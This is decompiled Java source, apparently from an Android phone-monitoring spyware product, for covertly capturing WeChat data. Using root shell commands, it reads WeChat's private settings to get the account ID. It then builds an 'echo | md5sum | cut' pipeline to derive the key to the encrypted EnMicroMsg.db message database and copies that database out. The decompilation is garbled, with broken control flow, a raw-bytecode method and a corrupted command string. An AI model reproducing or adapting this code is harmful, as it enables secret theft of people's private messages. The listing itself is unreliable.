package com.vvt.capture.wechat;

import com.vvt.ak.a;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class d {
    private static final boolean a = a.a;
    private static final boolean b = a.e;
    private static final Pattern c = Pattern.compile("name=\"default_uin\" value=\"(-?[0-9]+)\"");
    private static final Pattern d = Pattern.compile("(-?[0-9]+)");
    private static long e = 0L;
    private static final String[] f;

    static {
        String[] arrayOfString = new String[2];
        arrayOfString[0] = "EnMicroMsg.db";
        arrayOfString[1] = "EnMicroMsg2.db";
        f = arrayOfString;
    }

    /**
     * 提取uin
     */
    public static String a() {
        String str1 = null;
        String systemConfigPrefsFilePath = "/data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml";
        if (ShellUtil.b(systemConfigPrefsFilePath)) {
            localObject1 = "cat %s";
            boolean bool2 = true;
            try {
                localObject3 = new Object[bool2];
                localObject3[0] = "/data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml";
                localObject1 = String.format((String)localObject1, (Object[])localObject3);
                localObject1 = KMShell.a((String)localObject1);
            } catch (KMShell.ShellException e) {

            }

            bool2 = com.vvt.ag.b.a((String)localObject1);
            if (!bool2) {
                bool2 = a;
                if (bool2) {}
                localObject3 = c;
                localObject1 = ((Pattern)localObject3).matcher((CharSequence)localObject1);
                bool2 = ((Matcher)localObject1).find();
                if (!bool2) {
                    break label158;
                }

                localObject1 = ((Matcher)localObject1).group();
                bool2 = a;
                if (bool2) {}
                localObject3 = d;
                localObject1 = ((Pattern)localObject3).matcher((CharSequence)localObject1);
                bool2 = ((Matcher)localObject1).find();
                if (!bool2) {
                    break label147;
                }
                localObject1 = ((Matcher)localObject1).group();
                str1 = ((String)localObject1).trim();
                bool1 = a;
                if (!bool1) {}
            }
        }
        for (;;)
        {
            return str1;
            Object localObject2;
            label147:
            label158:
            bool1 = b;
            if (!bool1) {}
        }
    }

    public static String a(String paramString)
    {
        boolean bool1 = a;
        if (bool1) {}
        boolean bool3 = false;
        String[] arrayOfString = f;
        int j = arrayOfString.length;
        int k = 0;
        String str1;
        if (k < j)
        {
            str1 = arrayOfString[k];
            String str2 = "%s/%s/%s";
            int m = 3;
            Object[] arrayOfObject = new Object[m];
            String str3 = b.a;
            arrayOfObject[0] = str3;
            arrayOfObject[1] = paramString;
            int n = 2;
            arrayOfObject[n] = str1;
            str1 = String.format(str2, arrayOfObject);
            boolean bool5 = ShellUtil.b(str1);
            if (bool5)
            {
                long l1 = ShellUtil.c(str1);
                boolean bool4 = a;
                if (bool4) {}
                long l2 = 0L;
                bool5 = l1 < l2;
                if (!bool5) {}
            }
        }
        for (;;)
        {
            bool3 = a;
            if (bool3) {}
            return str1;
            bool1 = b;
            if (bool1) {}
            for (;;)
            {
                int i = k + 1;
                k = i;
                break;
                bool2 = b;
                if (!bool2) {}
            }
            boolean bool2 = false;
            str1 = null;
        }
    }

    private static String a(String paramString1, String paramString2)
    {
        String str1 = a();
        String str2 = null;
        boolean bool1 = com.vvt.ag.b.a(str1);
        int j;
        if (!bool1)
        {
            String str3 = "%s echo -n %s%s | %s md5sum | %s cut -MyUncaughtExceptionHandler -7";
            j = 5;
            Object[] arrayOfObject = new Object[j];
            arrayOfObject[0] = paramString2;
            arrayOfObject[1] = paramString1;
            int k = 2;
            arrayOfObject[k] = str1;
            arrayOfObject[3] = paramString2;
            int m = 4;
            arrayOfObject[m] = paramString2;
            str1 = String.format(str3, arrayOfObject);
            bool1 = a;
            if (!bool1) {}
        }
        for (;;)
        {
            try
            {
                str1 = KMShell.a(str1);
                bool1 = a;
                if (bool1) {}
                int i = str1.length();
                j = 7;
                if (i != j) {
                    continue;
                }
                str2 = str1;
                bool2 = a;
                if (!bool2) {}
            }
            catch (KMShell.ShellException localShellException)
            {
                boolean bool2;
                continue;
            }
            return str2;
            bool2 = b;
            if (!bool2) {}
        }
    }

    public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
    {
        boolean bool1 = a;
        if (bool1) {}
        boolean bool2 = false;
        Object localObject = new Object[1];
        localObject[0] = paramString2;
        String str1 = String.format("/data/data/com.tencent.mm/MicroMsg/%s/sfs/avatar.index", (Object[])localObject);
        localObject = com.vvt.capture.wechat.b.d.a(paramString1);
        String str2 = com.vvt.capture.wechat.b.d.a(paramString1, "com.tencent.mm");
        str1 = com.vvt.capture.wechat.b.d.a(str1, str2, (String)localObject, paramString4);
        boolean bool3 = com.vvt.ag.b.a(str1);
        if (!bool3)
        {
            bool2 = a;
            if (!bool2) {}
        }
        for (;;)
        {
            bool2 = a;
            if (bool2) {}
            return str1;
            bool1 = b;
            if (bool1) {}
            bool1 = false;
            str1 = null;
        }
    }

    /* Error */
    public static String b(String paramString1, String paramString2, String paramString3, String paramString4)
    {
        // Byte code:
        //   0: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   3: istore 4
        //   5: iload 4
        //   7: ifeq +3 -> 10
        //   10: iconst_0
        //   11: istore 5
        //   13: aconst_null
        //   14: astore 6
        //   16: aload_0
        //   17: ldc 119
        //   19: invokestatic 122	com/vvt/capture/wechat/removeFromPath/d:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   22: astore 7
        //   24: ldc 127
        //   26: astore 8
        //   28: aload 7
        //   30: aload 8
        //   32: invokestatic 130	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   35: astore 9
        //   37: getstatic 39	com/vvt/capture/wechat/d:e	J
        //   40: lstore 10
        //   42: lconst_0
        //   43: lstore 12
        //   45: lload 10
        //   47: lload 12
        //   49: lcmp
        //   50: istore 4
        //   52: iload 4
        //   54: ifle +105 -> 159
        //   57: invokestatic 136	java/lang/System:currentTimeMillis	()J
        //   60: lstore 10
        //   62: getstatic 39	com/vvt/capture/wechat/d:e	J
        //   65: lstore 12
        //   67: lload 10
        //   69: lload 12
        //   71: lsub
        //   72: lstore 10
        //   74: lload 10
        //   76: l2f
        //   77: fstore 14
        //   79: ldc -118
        //   81: fstore 15
        //   83: fload 14
        //   85: fload 15
        //   87: fdiv
        //   88: fstore 14
        //   90: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   93: istore 16
        //   95: iload 16
        //   97: ifeq +3 -> 100
        //   100: ldc -117
        //   102: istore 16
        //   104: ldc -116
        //   106: fstore 15
        //   108: fload 14
        //   110: fload 15
        //   112: fcmpg
        //   113: istore 4
        //   115: iload 4
        //   117: ifgt +42 -> 159
        //   120: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   123: istore 4
        //   125: iload 4
        //   127: ifeq +3 -> 130
        //   130: aload 9
        //   132: invokestatic 56	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
        //   135: istore 4
        //   137: iload 4
        //   139: ifeq +20 -> 159
        //   142: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   145: istore 4
        //   147: iload 4
        //   149: ifeq +3 -> 152
        //   152: aload 9
        //   154: astore 6
        //   156: aload 6
        //   158: areturn
        //   159: aload_0
        //   160: invokestatic 117	com/vvt/capture/wechat/removeFromPath/d:a	(Ljava/lang/String;)Ljava/lang/String;
        //   163: astore 8
        //   165: aload 7
        //   167: aload_1
        //   168: aload 8
        //   170: aload_3
        //   171: invokestatic 142	com/vvt/capture/wechat/d:MyUncaughtExceptionHandler	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   174: astore 17
        //   176: ldc -112
        //   178: astore 18
        //   180: aload_0
        //   181: aload 18
        //   183: invokestatic 130	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   186: astore 19
        //   188: aload 19
        //   190: invokestatic 56	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
        //   193: istore 16
        //   195: iload 16
        //   197: ifne +16 -> 213
        //   200: getstatic 23	com/vvt/capture/wechat/d:removeFromPath	Z
        //   203: istore 4
        //   205: iload 4
        //   207: ifeq -51 -> 156
        //   210: goto -54 -> 156
        //   213: aload 17
        //   215: invokestatic 71	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
        //   218: istore 16
        //   220: iload 16
        //   222: ifne +834 -> 1056
        //   225: aload_2
        //   226: aload 8
        //   228: invokestatic 145	com/vvt/capture/wechat/d:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   231: astore 20
        //   233: aload 20
        //   235: invokestatic 71	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
        //   238: istore 4
        //   240: iload 4
        //   242: ifne +814 -> 1056
        //   245: iconst_0
        //   246: istore 4
        //   248: fconst_0
        //   249: fstore 14
        //   251: aconst_null
        //   252: astore 8
        //   254: invokestatic 150	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
        //   257: astore 18
        //   259: ldc -104
        //   261: astore 8
        //   263: iconst_1
        //   264: istore 21
        //   266: iload 21
        //   268: anewarray 4	java/lang/Object
        //   271: astore 22
        //   273: iconst_0
        //   274: istore 23
        //   276: aconst_null
        //   277: astore 24
        //   279: aload 22
        //   281: iconst_0
        //   282: aload 7
        //   284: aastore
        //   285: aload 8
        //   287: aload 22
        //   289: invokestatic 62	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   292: astore 8
        //   294: aload 18
        //   296: aload 8
        //   298: invokevirtual 153	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
        //   301: pop
        //   302: ldc -101
        //   304: astore 8
        //   306: iconst_1
        //   307: istore 21
        //   309: iload 21
        //   311: anewarray 4	java/lang/Object
        //   314: astore 22
        //   316: iconst_0
        //   317: istore 23
        //   319: aconst_null
        //   320: astore 24
        //   322: aload 22
        //   324: iconst_0
        //   325: aload 9
        //   327: aastore
        //   328: aload 8
        //   330: aload 22
        //   332: invokestatic 62	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   335: astore 8
        //   337: aload 18
        //   339: aload 8
        //   341: invokevirtual 153	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
        //   344: pop
        //   345: ldc -99
        //   347: astore 8
        //   349: iconst_1
        //   350: istore 21
        //   352: iload 21
        //   354: anewarray 4	java/lang/Object
        //   357: astore 22
        //   359: iconst_0
        //   360: istore 23
        //   362: aconst_null
        //   363: astore 24
        //   365: aload 22
        //   367: iconst_0
        //   368: aload 19
        //   370: aastore
        //   371: aload 8
        //   373: aload 22
        //   375: invokestatic 62	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   378: astore 8
        //   380: aload 18
        //   382: aload 8
        //   384: invokevirtual 153	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
        //   387: pop
        //   388: new 159	java/util/ArrayList
        //   391: astore 8
        //   393: aload 8
        //   395: invokespecial 163	java/util/ArrayList:<init>	()V
        //   398: ldc -91
        //   400: astore 22
        //   402: iconst_2
        //   403: istore 23
        //   405: iload 23
        //   407: anewarray 4	java/lang/Object
        //   410: astore 24
        //   412: aload 24
        //   414: iconst_0
        //   415: aload 19
        //   417: aastore
        //   418: iconst_1
        //   419: istore 25
        //   421: aload 24
        //   423: iload 25
        //   425: aload 17
        //   427: aastore
        //   428: aload 22
        //   430: aload 24
        //   432: invokestatic 62	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   435: astore 19
        //   437: aload 8
        //   439: aload 19
        //   441: invokevirtual 169	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   444: pop
        //   445: ldc -85
        //   447: astore 19
        //   449: iconst_1
        //   450: istore 21
        //   452: iload 21
        //   454: anewarray 4	java/lang/Object
        //   457: astore 22
        //   459: iconst_0
        //   460: istore 23
        //   462: aconst_null
        //   463: astore 24
        //   465: aload 22
        //   467: iconst_0
        //   468: aload 20
        //   470: aastore
        //   471: aload 19
        //   473: aload 22
        //   475: invokestatic 62	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   478: astore 19
        //   480: aload 8
        //   482: aload 19
        //   484: invokevirtual 169	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   487: pop
        //   488: ldc -83
        //   490: astore 19
        //   492: aload 8
        //   494: aload 19
        //   496: invokevirtual 169	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   499: pop
        //   500: ldc -81
        //   502: astore 19
        //   504: aload 8
        //   506: aload 19
        //   508: invokevirtual 169	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   511: pop
        //   512: ldc -79
        //   514: astore 19
        //   516: aload 8
        //   518: aload 19
        //   520: invokevirtual 169	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   523: pop
        //   524: ldc -77
        //   526: astore 19
        //   528: aload 8
        //   530: aload 19
        //   532: invokevirtual 169	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   535: pop
        //   536: ldc -75
        //   538: astore 19
        //   540: aload 8
        //   542: aload 19
        //   544: invokevirtual 169	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   547: pop
        //   548: ldc -73
        //   550: astore 19
        //   552: aload 8
        //   554: aload 19
        //   556: invokevirtual 169	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   559: pop
        //   560: aload 8
        //   562: invokevirtual 187	java/util/ArrayList:iterator	()Ljava/util/Iterator;
        //   565: astore 19
        //   567: aload 19
        //   569: invokeinterface 192 1 0
        //   574: istore 4
        //   576: iload 4
        //   578: ifeq +40 -> 618
        //   581: aload 19
        //   583: invokeinterface 196 1 0
        //   588: astore 8
        //   590: aload 8
        //   592: checkcast 42	java/lang/String
        //   595: astore 8
        //   597: aload 18
        //   599: aload 8
        //   601: invokevirtual 153	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
        //   604: pop
        //   605: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   608: istore 4
        //   610: iload 4
        //   612: ifeq -45 -> 567
        //   615: goto -48 -> 567
        //   618: ldc -58
        //   620: astore 8
        //   622: aload 18
        //   624: aload 8
        //   626: invokevirtual 153	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
        //   629: pop
        //   630: ldc -56
        //   632: astore 8
        //   634: iconst_2
        //   635: istore 25
        //   637: iload 25
        //   639: anewarray 4	java/lang/Object
        //   642: astore 19
        //   644: iconst_0
        //   645: istore 26
        //   647: aconst_null
        //   648: astore 20
        //   650: ldc -54
        //   652: astore 22
        //   654: aload 19
        //   656: iconst_0
        //   657: aload 22
        //   659: aastore
        //   660: iconst_1
        //   661: istore 26
        //   663: aload 19
        //   665: iload 26
        //   667: aload 9
        //   669: aastore
        //   670: aload 8
        //   672: aload 19
        //   674: invokestatic 62	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   677: astore 8
        //   679: aload 18
        //   681: aload 8
        //   683: invokevirtual 153	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
        //   686: astore 8
        //   688: ldc -52
        //   690: astore 19
        //   692: aload 8
        //   694: aload 19
        //   696: invokevirtual 208	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
        //   699: istore 4
        //   701: iload 4
        //   703: ifne +207 -> 910
        //   706: iconst_1
        //   707: istore 4
        //   709: ldc 45
        //   711: fstore 14
        //   713: iload 4
        //   715: ifeq +329 -> 1044
        //   718: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   721: istore 4
        //   723: iload 4
        //   725: ifeq +3 -> 728
        //   728: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   731: istore 4
        //   733: iload 4
        //   735: ifeq +3 -> 738
        //   738: ldc -46
        //   740: astore 8
        //   742: iconst_3
        //   743: istore 5
        //   745: iload 5
        //   747: anewarray 4	java/lang/Object
        //   750: astore 6
        //   752: iconst_0
        //   753: istore 25
        //   755: aconst_null
        //   756: astore 19
        //   758: aload 6
        //   760: iconst_0
        //   761: aload_3
        //   762: aastore
        //   763: iconst_1
        //   764: istore 25
        //   766: aload 6
        //   768: iload 25
        //   770: aload_3
        //   771: aastore
        //   772: iconst_2
        //   773: istore 25
        //   775: aload 6
        //   777: iload 25
        //   779: aload 9
        //   781: aastore
        //   782: aload 8
        //   784: aload 6
        //   786: invokestatic 62	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   789: astore 8
        //   791: aload 18
        //   793: aload 8
        //   795: invokevirtual 153	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
        //   798: pop
        //   799: invokestatic 214	com/vvt/aa/a:MyUncaughtExceptionHandler	()Z
        //   802: istore 4
        //   804: iload 4
        //   806: ifeq +13 -> 819
        //   809: aload 7
        //   811: invokestatic 218	com/vvt/shell/ShellUtil:k	(Ljava/lang/String;)V
        //   814: aload 9
        //   816: invokestatic 218	com/vvt/shell/ShellUtil:k	(Ljava/lang/String;)V
        //   819: invokestatic 136	java/lang/System:currentTimeMillis	()J
        //   822: lstore 27
        //   824: lload 27
        //   826: putstatic 39	com/vvt/capture/wechat/d:e	J
        //   829: aload 9
        //   831: astore 8
        //   833: ldc -101
        //   835: astore 6
        //   837: iconst_1
        //   838: istore 29
        //   840: iload 29
        //   842: anewarray 4	java/lang/Object
        //   845: astore 9
        //   847: aconst_null
        //   848: astore 7
        //   850: aload 9
        //   852: iconst_0
        //   853: aload 17
        //   855: aastore
        //   856: aload 6
        //   858: aload 9
        //   860: invokestatic 62	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   863: astore 6
        //   865: aload 18
        //   867: aload 6
        //   869: invokevirtual 153	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
        //   872: pop
        //   873: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   876: istore 5
        //   878: iload 5
        //   880: ifeq +3 -> 883
        //   883: aload 18
        //   885: ifnull +8 -> 893
        //   888: aload 18
        //   890: invokevirtual 220	com/vvt/shell/f:d	()V
        //   893: getstatic 19	com/vvt/capture/wechat/d:a	Z
        //   896: istore 5
        //   898: iload 5
        //   900: ifeq +3 -> 903
        //   903: aload 8
        //   905: astore 6
        //   907: goto -751 -> 156
        //   910: iconst_0
        //   911: istore 4
        //   913: fconst_0
        //   914: fstore 14
        //   916: aconst_null
        //   917: astore 8
        //   919: goto -206 -> 713
        //   922: astore 9
        //   924: iconst_0
        //   925: istore 4
        //   927: aconst_null
        //   928: astore 8
        //   930: fconst_0
        //   931: fstore 14
        //   933: iconst_0
        //   934: istore 5
        //   936: aconst_null
        //   937: astore 6
        //   939: getstatic 23	com/vvt/capture/wechat/d:removeFromPath	Z
        //   942: istore 29
        //   944: iload 29
        //   946: ifeq +3 -> 949
        //   949: aload 6
        //   951: ifnull -58 -> 893
        //   954: aload 6
        //   956: invokevirtual 220	com/vvt/shell/f:d	()V
        //   959: goto -66 -> 893
        //   962: astore 6
        //   964: iconst_0
        //   965: istore 16
        //   967: aconst_null
        //   968: astore 18
        //   970: fconst_0
        //   971: fstore 15
        //   973: aload 6
        //   975: astore 8
        //   977: aload 18
        //   979: ifnull +8 -> 987
        //   982: aload 18
        //   984: invokevirtual 220	com/vvt/shell/f:d	()V
        //   987: aload 8
        //   989: athrow
        //   990: astore 8
        //   992: goto -15 -> 977
        //   995: astore 8
        //   997: aload 6
        //   999: astore 18
        //   1001: goto -24 -> 977
        //   1004: astore 8
        //   1006: iconst_0
        //   1007: istore 4
        //   1009: aconst_null
        //   1010: astore 8
        //   1012: fconst_0
        //   1013: fstore 14
        //   1015: aload 18
        //   1017: astore 6
        //   1019: goto -80 -> 939
        //   1022: astore 8
        //   1024: aload 18
        //   1026: astore 6
        //   1028: aload 9
        //   1030: astore 8
        //   1032: goto -93 -> 939
        //   1035: astore 6
        //   1037: aload 18
        //   1039: astore 6
        //   1041: goto -102 -> 939
        //   1044: iconst_0
        //   1045: istore 4
        //   1047: aconst_null
        //   1048: astore 8
        //   1050: fconst_0
        //   1051: fstore 14
        //   1053: goto -220 -> 833
        //   1056: iconst_0
        //   1057: istore 4
        //   1059: aconst_null
        //   1060: astore 8
        //   1062: fconst_0
        //   1063: fstore 14
        //   1065: goto -172 -> 893
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	1068	0	paramString1	String
        //   0	1068	1	paramString2	String
        //   0	1068	2	paramString3	String
        //   0	1068	3	paramString4	String
        //   3	1055	4	bool1	boolean
        //   11	735	5	i	int
        //   876	59	5	bool2	boolean
        //   14	941	6	localObject1	Object
        //   962	36	6	localObject2	Object
        //   1017	10	6	localObject3	Object
        //   1035	1	6	localException1	Exception
        //   1039	1	6	localObject4	Object
        //   22	827	7	str1	String
        //   26	962	8	localObject5	Object
        //   990	1	8	localObject6	Object
        //   995	1	8	localObject7	Object
        //   1004	1	8	localException2	Exception
        //   1010	1	8	localObject8	Object
        //   1022	1	8	localException3	Exception
        //   1030	31	8	localObject9	Object
        //   35	824	9	localObject10	Object
        //   922	107	9	localException4	Exception
        //   40	35	10	l1	long
        //   43	27	12	l2	long
        //   77	987	14	f1	float
        //   81	891	15	f2	float
        //   93	3	16	bool3	boolean
        //   102	1	16	j	int
        //   193	773	16	bool4	boolean
        //   174	680	17	str2	String
        //   178	860	18	localObject11	Object
        //   186	571	19	localObject12	Object
        //   231	418	20	str3	String
        //   264	189	21	k	int
        //   271	387	22	localObject13	Object
        //   274	187	23	m	int
        //   277	187	24	arrayOfObject	Object[]
        //   419	359	25	n	int
        //   645	21	26	i1	int
        //   822	3	27	l3	long
        //   838	107	29	bool5	boolean
        // Exception table:
        //   from	to	target	type
        //   254	257	922	java/lang/Exception
        //   254	257	962	finally
        //   266	271	990	finally
        //   282	285	990	finally
        //   287	292	990	finally
        //   296	302	990	finally
        //   309	314	990	finally
        //   325	328	990	finally
        //   330	335	990	finally
        //   339	345	990	finally
        //   352	357	990	finally
        //   368	371	990	finally
        //   373	378	990	finally
        //   382	388	990	finally
        //   388	391	990	finally
        //   393	398	990	finally
        //   405	410	990	finally
        //   415	418	990	finally
        //   425	428	990	finally
        //   430	435	990	finally
        //   439	445	990	finally
        //   452	457	990	finally
        //   468	471	990	finally
        //   473	478	990	finally
        //   482	488	990	finally
        //   494	500	990	finally
        //   506	512	990	finally
        //   518	524	990	finally
        //   530	536	990	finally
        //   542	548	990	finally
        //   554	560	990	finally
        //   560	565	990	finally
        //   567	574	990	finally
        //   581	588	990	finally
        //   590	595	990	finally
        //   599	605	990	finally
        //   605	608	990	finally
        //   624	630	990	finally
        //   637	642	990	finally
        //   657	660	990	finally
        //   667	670	990	finally
        //   672	677	990	finally
        //   681	686	990	finally
        //   694	699	990	finally
        //   718	721	990	finally
        //   728	731	990	finally
        //   745	750	990	finally
        //   761	763	990	finally
        //   770	772	990	finally
        //   779	782	990	finally
        //   784	789	990	finally
        //   793	799	990	finally
        //   799	802	990	finally
        //   809	814	990	finally
        //   814	819	990	finally
        //   819	822	990	finally
        //   824	829	990	finally
        //   840	845	990	finally
        //   853	856	990	finally
        //   858	863	990	finally
        //   867	873	990	finally
        //   873	876	990	finally
        //   939	942	995	finally
        //   266	271	1004	java/lang/Exception
        //   282	285	1004	java/lang/Exception
        //   287	292	1004	java/lang/Exception
        //   296	302	1004	java/lang/Exception
        //   309	314	1004	java/lang/Exception
        //   325	328	1004	java/lang/Exception
        //   330	335	1004	java/lang/Exception
        //   339	345	1004	java/lang/Exception
        //   352	357	1004	java/lang/Exception
        //   368	371	1004	java/lang/Exception
        //   373	378	1004	java/lang/Exception
        //   382	388	1004	java/lang/Exception
        //   388	391	1004	java/lang/Exception
        //   393	398	1004	java/lang/Exception
        //   405	410	1004	java/lang/Exception
        //   415	418	1004	java/lang/Exception
        //   425	428	1004	java/lang/Exception
        //   430	435	1004	java/lang/Exception
        //   439	445	1004	java/lang/Exception
        //   452	457	1004	java/lang/Exception
        //   468	471	1004	java/lang/Exception
        //   473	478	1004	java/lang/Exception
        //   482	488	1004	java/lang/Exception
        //   494	500	1004	java/lang/Exception
        //   506	512	1004	java/lang/Exception
        //   518	524	1004	java/lang/Exception
        //   530	536	1004	java/lang/Exception
        //   542	548	1004	java/lang/Exception
        //   554	560	1004	java/lang/Exception
        //   560	565	1004	java/lang/Exception
        //   567	574	1004	java/lang/Exception
        //   581	588	1004	java/lang/Exception
        //   590	595	1004	java/lang/Exception
        //   599	605	1004	java/lang/Exception
        //   605	608	1004	java/lang/Exception
        //   624	630	1004	java/lang/Exception
        //   637	642	1004	java/lang/Exception
        //   657	660	1004	java/lang/Exception
        //   667	670	1004	java/lang/Exception
        //   672	677	1004	java/lang/Exception
        //   681	686	1004	java/lang/Exception
        //   694	699	1004	java/lang/Exception
        //   718	721	1004	java/lang/Exception
        //   728	731	1022	java/lang/Exception
        //   745	750	1022	java/lang/Exception
        //   761	763	1022	java/lang/Exception
        //   770	772	1022	java/lang/Exception
        //   779	782	1022	java/lang/Exception
        //   784	789	1022	java/lang/Exception
        //   793	799	1022	java/lang/Exception
        //   799	802	1022	java/lang/Exception
        //   809	814	1022	java/lang/Exception
        //   814	819	1022	java/lang/Exception
        //   819	822	1022	java/lang/Exception
        //   824	829	1022	java/lang/Exception
        //   840	845	1035	java/lang/Exception
        //   853	856	1035	java/lang/Exception
        //   858	863	1035	java/lang/Exception
        //   867	873	1035	java/lang/Exception
        //   873	876	1035	java/lang/Exception
    }

    private static String c(String paramString1, String paramString2, String paramString3, String paramString4)
    {
        boolean bool1 = a;
        if (bool1) {}
        boolean bool2 = false;
        String str = a(paramString2);
        boolean bool3 = com.vvt.ag.b.a(str);
        if (!bool3)
        {
            bool3 = a;
            if (bool3) {}
            str = com.vvt.capture.wechat.b.d.a(str, paramString1, paramString3, paramString4);
            bool3 = com.vvt.ag.b.a(str);
            if (!bool3)
            {
                bool3 = ShellUtil.b(str);
                if (bool3)
                {
                    bool2 = a;
                    if (bool2) {}
                    bool2 = a;
                    if (bool2) {}
                    return str;
                }
            }
            bool1 = b;
            if (!bool1) {}
        }
        for (;;)
        {
            bool1 = false;
            str = null;
            break;
            bool1 = b;
            if (!bool1) {}
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */